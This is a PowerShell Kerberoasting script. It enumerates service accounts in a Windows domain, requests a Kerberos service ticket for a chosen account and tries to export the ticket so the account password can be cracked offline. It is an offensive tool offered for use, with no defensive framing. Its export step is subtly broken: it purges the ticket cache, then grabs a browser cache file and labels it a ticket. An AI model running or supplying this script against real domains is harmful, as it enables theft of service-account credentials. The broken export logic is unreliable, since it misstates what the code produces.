# Interactive Kerberoasting Script 
Write-Host "[+] Enumerating SPNs in the Domain..." -ForegroundColor Cyan

# Enumerate SPNs
$SPNs = setspn -T $env:USERDNSDOMAIN -Q */* | Select-String '/' | ForEach-Object {
    $line = $_.ToString().Trim()
    if ($line -match "^([^\s]+)\s+(.*)$") {
        [PSCustomObject]@{
            User = $matches[1]
            SPN  = $matches[2]
        }
    }
}

if (!$SPNs) {
    Write-Error "[-] No SPNs found. Exiting."
    exit
}

# Display SPNs interactively
Write-Host "[+] Available SPNs:" -ForegroundColor Green
for ($i = 0; $i -lt $SPNs.Count; $i++) {
    Write-Host "[$i] User: $($SPNs[$i].User) | SPN: $($SPNs[$i].SPN)" -ForegroundColor Yellow
}

# Prompt for selection
$selection = Read-Host "Enter the number of the SPN you want to roast"
if ($selection -notmatch '^[0-9]+$' -or [int]$selection -ge $SPNs.Count) {
    Write-Error "[-] Invalid selection. Exiting."
    exit
}

$chosenSPN = $SPNs[$selection].SPN
Write-Host "[+] Requesting ticket for SPN: $chosenSPN" -ForegroundColor Cyan

# Request ticket
Add-Type -AssemblyName System.IdentityModel
$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $chosenSPN

# Export tickets using klist
Write-Host "[+] Current tickets in cache:" -ForegroundColor Green
klist tickets

# Export ticket
$outputTicket = "ticket.kirbi"
Write-Host "[+] Exporting ticket to $outputTicket" -ForegroundColor Cyan
klist.exe purge | Out-Null
Invoke-WebRequest -UseDefaultCredentials -Uri ("http://" + ($chosenSPN.Split("/")[1])) -ErrorAction SilentlyContinue | Out-Null

# Locate the cached ticket
$ticketCache = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INetCache\"
$ticketFile = Get-ChildItem -Path $ticketCache -Recurse -Filter "*.cache" | Sort-Object LastWriteTime -Descending | Select-Object -First 1

if (!$ticketFile) {
    Write-Error "[-] Could not find cached ticket. Exiting."
    exit
}

# Convert to base64 and export
certutil -f -encode $ticketFile.FullName $outputTicket

Write-Host "[+] Ticket exported successfully as $outputTicket. Decode it using certutil before cracking." -ForegroundColor Green
Write-Host "[+] Decode command: certutil -decode $outputTicket ticket.bin" -ForegroundColor Green

Write-Host "[+] Process complete." -ForegroundColor Cyan
